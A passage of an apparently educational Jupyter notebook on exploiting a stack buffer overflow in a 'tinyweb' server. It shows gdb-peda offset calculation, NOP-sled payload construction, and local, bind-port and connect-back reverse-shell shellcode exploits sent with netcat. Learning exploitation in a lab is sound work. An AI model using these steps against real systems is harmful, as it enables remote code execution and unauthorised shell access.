    "gdb-peda$ x/x $ebp+4 # gives the address where return address is stored on stack - 0xbfffec7c\n",
    "gdb-peda$ p /u [add of return address] - [request address] # the bytes away from the request which is 524 bytes = OFFSET\n",
    "echo $((0x…))\n",
    "Few bytes near the beginning of the buffer may be mangled so skip first 200 bytes\n",
    "\n",
    "```\n",
    "- exit the debugger and rerun the server on the same terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Local Shellcode Exploit\n",
    "- create a exploit code and send it to the server\n",
    "- total length of string buffer is the offset or difference between the return address - request buffer + 4 bytes\n",
    "\n",
    "```\n",
    "| repeated NOP SLED \\x90 | exploit code | repeated controlled return addrees that will land somewhere in NOP SLED |\n",
    "\n",
    "```\n",
    "\n",
    "- total length - exploit code length - 30 x return address\n",
    "\n",
    "```\n",
    "echo $((524+4-24-30*4))\n",
    "```\n",
    "\n",
    "- find soft landing zone in nop sled\n",
    "\n",
    "```\n",
    "$echo printf \"%x\" $((address of request + 100))\n",
    "```\n",
    "\n",
    "- create and send the final exploit code\n",
    "\n",
    "```\n",
    "echo -n $(perl -e 'print \"\\x90\"x384'; cat shellcode.bin; perl -e 'print \"landing address in reverse order\"x30 . \"\\r\\n\"') > tinyexploit.txt\n",
    "cat tinyexploit.txt | nc -v 127.0.0.1 8080\n",
    "```\n",
    "- you'll get a local shell on the terminal where tinyweb.exe is running"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Port Binding Shellcode Exploit\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "```\n",
    "gdb-peda$ shellcode generate\n",
    "gdb-peda$ shellcode generate x86/linux bindport  port ip\n",
    "$ perl -e 'print \"copy line by line\"' >> bindport.bin\n",
    "$ echo -n $(perl -e 'print \"\\x90\"x384'; cat bind.bin; perl -e 'print \"landing address in reverse order\"x30 . \"\\r\\n\"') > tinyexploit.bin\n",
    "$ cat tinyexploit.txt | nc -v ip port\n",
    "```\n",
    "- from another cell use nc to connect to the victim ip using the shellcode port"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Connect-back Shellcode Exploit\n",
    "- connecting to the victim machine is not easy due to firewall and IDS, IPS, etc.\n",
    "- out going connection is typically allowed, so we create connect back (TCP Reverse connect) shellcode\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "```\n",
    "gdb-peda$ shellcode generate x86/linux connect port ip\n",
    "\n",
    "```\n",
    "- write shellcode to a file as binary one line at a time\n",
    "\n",
    "```\n",
    "$ echo -n -e 'shellcode line1' > reverse_tcp.bin\n",
    "$ echo -n -e 'shellcode line2' >> reverse_tcp.bin\n",
    "...\n",
    "```\n",
    "\n",
    "- calculate [NOP sled*n + reverse_tcp.bin + repeated return address]\n",
    "- repeated return address = address of request + 100\n",
    "- run a server on attacker machine so the victim can connect back\n",
    "    - nc -v -l -p port\n",
    "- create a bogus exploit request and send it to the server using netcat\n",
    "```\n",
    "$ echo -n -e $(perl -e 'print \"\\x90\"xn; cat reverse_tcp.bin; perl -e 'print \"controlled return add\"x m. \"\\r\\n\"' | nc -v ip port\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### References\n",
    "1. Understanding Layer 2, 3, and 4 Protocols - http://ptgmedia.pearsoncmg.com/images/0131014684/samplechapter/0131014684_ch02.pdf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
